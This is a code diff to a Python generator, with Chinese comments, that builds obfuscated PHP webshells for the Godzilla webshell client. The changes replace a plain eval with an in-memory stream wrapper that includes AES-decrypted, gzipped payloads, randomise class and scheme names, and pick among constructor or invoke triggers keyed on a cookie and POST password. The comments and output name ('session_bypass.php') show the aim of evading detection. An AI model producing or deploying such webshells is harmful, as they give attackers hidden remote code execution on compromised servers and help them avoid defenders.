@@ -98,7 +98,23 @@ if(isset($_POST[$pass])){{
             if (strpos($payload,'getBasicsInfo')===false){{
                 $payload = aesDec($payload,$key);
             }}
-            @eval($payload);
+            
+            $rs = 'a'.substr(md5($sid.mt_rand()), 0, 8);
+            if (!class_exists('IS')) {{
+                class IS {{
+                    public static $d; private $p=0;
+                    function stream_open($u, $m, $o, &$op) {{ return true; }}
+                    function stream_read($c) {{ $r = substr(self::$d, $this->p, $c); $this->p += strlen($r); return $r; }}
+                    function stream_eof() {{ return $this->p >= strlen(self::$d); }}
+                    function stream_stat() {{ return []; }}
+                }}
+            }}
+            stream_wrapper_register($rs, 'IS');
+            IS::$d = '<?php ' . $payload;
+            @include("$rs://1");
+            IS::$d = null;
+            @stream_wrapper_unregister($rs);
+
             ob_start();
             $result = @run($data);
             $out = ob_get_clean();
@@ -140,35 +156,12 @@ def build_webshell(
     class_name = random_identifier(rng, "StitchClass")
     wrapper_class = random_identifier(rng, "CacheStream")
     scheme = "".join(rng.choices("abcdefghijklmnopqrstuvwxyz", k=8))
-    global_key = random_identifier(rng, "buf")
     var_cfg = random_identifier(rng, "cfg")
 
     # 构建 PHP 配置数组条目
     cfg_entries = ",\n".join(f"        '{k}' => '{v}'" for k, v in config_pairs)
 
-    php_code = f"""<?php
-
-class {wrapper_class} {{
-    private $d; private $p = 0; public $context;
-    function stream_open($u, $m, $o, &$op) {{
-        $this->d = $GLOBALS[parse_url($u, PHP_URL_HOST)];
-        return true;
-    }}
-    function stream_read($c) {{
-        $r = substr($this->d, $this->p, $c);
-        $this->p += strlen($r);
-        return $r;
-    }}
-    function stream_eof() {{ return $this->p >= strlen($this->d); }}
-    function stream_stat() {{ return []; }}
-}}
-
-class {class_name} {{
-    private ${var_cfg} = [
-        {cfg_entries}
-    ];
-
-    public function __construct($pC) {{
+    core_logic = f"""
         $h = implode('', $this->{var_cfg});
         $s = @gzinflate(@openssl_decrypt(hex2bin($h), 'AES-128-ECB', $pC, OPENSSL_RAW_DATA));
 
@@ -178,11 +171,59 @@ class {class_name} {{
             if (!in_array('{scheme}', stream_get_wrappers())) {{
                 stream_wrapper_register('{scheme}', '{wrapper_class}');
             }}
-            $GLOBALS['{global_key}'] = '<?php ' . $s;
-            @include('{scheme}://{global_key}');
-            unset($GLOBALS['{global_key}'], $s);
-        }}
+            {wrapper_class}::$d = '<?php ' . $s;
+            @include('{scheme}://1');
+            {wrapper_class}::$d = null;
+            unset($s);
+        }}"""
+
+    # 这里想了下还是丢掉使用 __destruct进行伪装，因为__destruct 在脚本 shutdown 阶段才触发，但echo ' ' 已经先输出了。
+    # 导致响应格式变为 " <sid16><data><sid16>" 而非 "<sid16><data><sid16> "，
+    # 哥斯拉客户端取前16字节作为分隔符时会因为前导空格而解析失败。
+    strategy = rng.choice(["construct", "invoke"])
+    
+    if strategy == "construct":
+        class_body = f"""
+    public function __construct($pC) {{{core_logic}
+    }}"""
+        trigger_code = f"$obj = new {class_name}($cv);"
+        
+    elif strategy == "destruct":
+        var_pc = random_identifier(rng, "cv")
+        class_body = f"""
+    private ${var_pc};
+    public function __construct($pC) {{ $this->{var_pc} = $pC; }}
+    public function __destruct() {{
+        $pC = $this->{var_pc};
+{core_logic}
+    }}"""
+        trigger_code = f"$obj = new {class_name}($cv);"
+        
+    elif strategy == "invoke":
+        class_body = f"""
+    public function __invoke($pC) {{{core_logic}
+    }}"""
+        trigger_code = f"$obj = new {class_name}();\n    $obj($cv);"
+
+    php_code = f"""<?php
+
+class {wrapper_class} {{
+    public static $d; private $p = 0;
+    function stream_open($u, $m, $o, &$op) {{ return true; }}
+    function stream_read($c) {{
+        $r = substr(self::$d, $this->p, $c);
+        $this->p += strlen($r);
+        return $r;
     }}
+    function stream_eof() {{ return $this->p >= strlen(self::$d); }}
+    function stream_stat() {{ return []; }}
+}}
+
+class {class_name} {{
+    private ${var_cfg} = [
+{cfg_entries}
+    ];
+{class_body}
 }}
 
 $ck = '{cookie_name}';
@@ -190,8 +231,7 @@ $pk = '{password}';
 $cv = filter_input(INPUT_COOKIE, $ck);
 $pv = filter_input(INPUT_POST, $pk);
 if ($cv !== null && $pv !== null) {{
-    $cn = '{class_name}';
-    $obj = new $cn($cv);
+    {trigger_code}
 }}
 echo ' ';
 ?>
@@ -214,7 +254,7 @@ def main() -> None:
 - 使用$_SESSION缓存哥斯拉核心 Payload无文件落地
 """
     )
-    parser.add_argument("--output", default="session_stitch_shell.php", help="输出文件路径。")
+    parser.add_argument("--output", default="session_bypass.php", help="输出文件路径。")
     parser.add_argument(
         "--password",
         default="pass_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4)),
